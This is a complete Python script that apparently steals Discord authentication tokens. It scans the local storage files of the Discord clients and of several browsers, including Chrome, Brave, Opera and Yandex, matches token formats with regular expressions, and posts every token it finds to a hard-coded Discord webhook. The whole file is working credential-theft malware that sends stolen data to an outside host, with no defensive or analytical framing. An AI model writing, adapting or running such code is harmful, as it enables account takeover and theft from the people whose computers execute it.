import re
import os
import dhooks

WEBHOOK_URL = "https://discord.com/api/webhooks/1140350705622851685/zCCNc9vRv12wCARvhRK-xY_UFIJv7JTJIBXZDZMY_UEw-Gz5oeraAye2Pul_PcqYsGju"


def find_tokens(path):
    path += r'\Local Storage\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def get_accounts():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Chromium': local + '\\Chromium\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
    }

    # Verify if paths exists
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        # Look for tokens in the paths
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                
                # Sends the info through the webhook
                wb = dhooks.Webhook(WEBHOOK_URL)
                wb.send(f"Platform: {platform}\tToken: {token}")


get_accounts()
